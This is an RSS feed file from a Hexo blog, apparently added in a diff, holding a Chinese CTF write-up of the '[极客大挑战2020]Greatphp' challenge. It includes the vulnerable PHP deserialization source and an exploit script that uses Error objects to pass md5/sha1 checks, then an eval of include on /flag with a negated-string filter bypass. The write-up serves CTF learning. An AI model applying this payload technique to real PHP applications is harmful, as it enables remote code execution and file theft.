@@ -1,0 +1,120 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Hexo • Posts by &#34;md5()和sha1()对类进行hash 触发__tostring方法&#34; tag</title>
+        <link>http://odiws.github.io</link>
+        <description></description>
+        <language>en</language>
+        <pubDate>Sun, 28 Jul 2024 22:19:51 +0800</pubDate>
+        <lastBuildDate>Sun, 28 Jul 2024 22:19:51 +0800</lastBuildDate>
+        <category>python</category>
+        <category>buuctf</category>
+        <category>ctf</category>
+        <category>http</category>
+        <category>php原生类利用</category>
+        <category>php反序列化</category>
+        <category>md5()和sha1()对类进行hash 触发__toString方法</category>
+        <category>mongodb注入</category>
+        <category>cms框架</category>
+        <category>条件竞争：利用session.upload_progress</category>
+        <category>preg_match绕过</category>
+        <category>$_server query_string 绕过</category>
+        <category>$_request绕过</category>
+        <category>file_get_cotents绕过</category>
+        <category>sha1函数比较数组绕过</category>
+        <category>create_function运用</category>
+        <category>json数据爬虫</category>
+        <category>regexp注入</category>
+        <category>js</category>
+        <category>ECB加密</category>
+        <category>buuctf， 反序列化</category>
+        <category>phar反序列化</category>
+        <category>thinkphpV6.0.0</category>
+        <category>php7 segment fault特性</category>
+        <category>pickle反序列化</category>
+        <category>buuctf， 伪随机数</category>
+        <category>CRLF Injection</category>
+        <category>soap</category>
+        <category>zip加密</category>
+        <category>system_file</category>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/07/28/2020-Greatphp/</guid>
+            <title>[极客大挑战2020]Greatphp</title>
+            <link>http://odiws.github.io/2024/07/28/2020-Greatphp/</link>
+            <category>buuctf</category>
+            <category>php原生类利用</category>
+            <category>php反序列化</category>
+            <category>md5()和sha1()对类进行hash 触发__toString方法</category>
+            <pubDate>Sun, 28 Jul 2024 22:19:51 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;极客大挑战2020greatphp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战2020greatphp&#34;&gt;#&lt;/a&gt; [极客大挑战 2020] Greatphp&lt;/h2&gt;
+&lt;p&gt;源码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+error_reporting(0);
+class SYCLOVER &amp;#123;
+    public $syc;
+    public $lover;
+ 
+    public function __wakeup()&amp;#123;
+        if( ($this-&amp;gt;syc != $this-&amp;gt;lover) &amp;amp;&amp;amp; (md5($this-&amp;gt;syc) === md5($this-&amp;gt;lover)) &amp;amp;&amp;amp; (sha1($this-&amp;gt;syc)=== sha1($this-&amp;gt;lover)) )&amp;#123;
+           if(!preg_match(&amp;quot;/\&amp;lt;\?php|\(|\)|\&amp;quot;|\&#39;/&amp;quot;, $this-&amp;gt;syc, $match))&amp;#123;
+               eval($this-&amp;gt;syc);
+           &amp;#125; else &amp;#123;
+               die(&amp;quot;Try Hard !!&amp;quot;);
+           &amp;#125;
+           
+        &amp;#125;
+    &amp;#125;
+&amp;#125;
+ 
+if (isset($_GET[&#39;great&#39;]))&amp;#123;
+    unserialize($_GET[&#39;great&#39;]);
+&amp;#125; else &amp;#123;
+    highlight_file(__FILE__);
+&amp;#125;
+ 
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这一个条件，在普通的题目里，只需要用数组绕过即可，但是这里是在类中，该怎么绕过呢？&lt;/p&gt;
+&lt;p&gt;我们可以使用含有 __toString 方法的 php 内置类来绕过，用的两个比较多的内置类是 Exception 和 Error ，他们之中有一个 __toString fangfa , 当类被当作字符串处理时，就会调用这个函数，以 Error 类为例，我们可控当触发他的__toString 方法时会发生什么？&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020%5DGreatphp/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现会以字符串的形式 输出当前报错，包含当前的错误信息， 以及他出现错误的行号 (3)，从而传入 Error (“payload”,9) 中的错误代码 “9 ” 则没有被输出出来，再来看看如何 绕过 md5 以及 sha1.&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020%5DGreatphp/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可见 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mtext&gt;和&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;a 和&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;和&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; b 这两个对象本身是不同的。但是  __toString 方法返回的结果是相同的，这里之所以需要在同一行是因为 __toString 返回的数据包含当前的行号&lt;/p&gt;
+&lt;p&gt;Exception 类与 Error 类的使用和结果完全一样，只不过 Exception 类适用于 PHP 5 和 7 而 Error 只适用于 php7&lt;/p&gt;
+&lt;p&gt;我们可以将题目代码中的 $syc 和 $lover 分别声明为类似上面的内置类对象，让着两个对象本身不同 (传入的错误代码即可)， 但是 __toString 方法输出的结果相同即可。&lt;/p&gt;
+&lt;p&gt;由于题目 用 preg_match 过滤了小括号 无法调用函数，所以我们尝试 直接 include “/flag” 将 flag 包含进来即可，由于过滤了引号，我们直接用 url 取反绕过即可。&lt;/p&gt;
+&lt;p&gt;exp：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+class SYCLOVER &amp;#123;
+    public $syc;
+    public $lover;
+    public function __wakeup()&amp;#123;
+        if( ($this-&amp;gt;syc != $this-&amp;gt;lover) &amp;amp;&amp;amp; (md5($this-&amp;gt;syc) === md5($this-&amp;gt;lover)) &amp;amp;&amp;amp; (sha1($this-&amp;gt;syc)=== sha1($this-&amp;gt;lover)) )&amp;#123;
+           if(!preg_match(&amp;quot;/\&amp;lt;\?php|\(|\)|\&amp;quot;|\&#39;/&amp;quot;, $this-&amp;gt;syc, $match))&amp;#123;
+               eval($this-&amp;gt;syc);
+           &amp;#125; else &amp;#123;
+               die(&amp;quot;Try Hard !!&amp;quot;);
+           &amp;#125;
+           
+
+        &amp;#125;
+    &amp;#125;
+
+&amp;#125;
+$str = &amp;quot;?&amp;gt;&amp;lt;?=include~&amp;quot;.urldecode(&amp;quot;%D0%99%93%9E%98&amp;quot;).&amp;quot;?&amp;gt;&amp;quot;;
+$a=new Error($str,1);$b=new Error($str,2);
+$c = new SYCLOVER();
+$c-&amp;gt;syc = $a;
+$c-&amp;gt;lover = $b;
+echo(urlencode(serialize($c)));
+
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020%5DGreatphp/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;总结：&lt;br&gt;
+error 原生类 __toString 方法的结果是相同的。 记住行号也需要一样，他们的值是不一样的，但是呢， 结果的 md5 值是一样的，从而可以绕过 。执行 eval 函数，eval include /flag。&lt;/p&gt;
+&lt;p&gt;对 php 原生类 有了些许了解，但还需要继续学习。&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
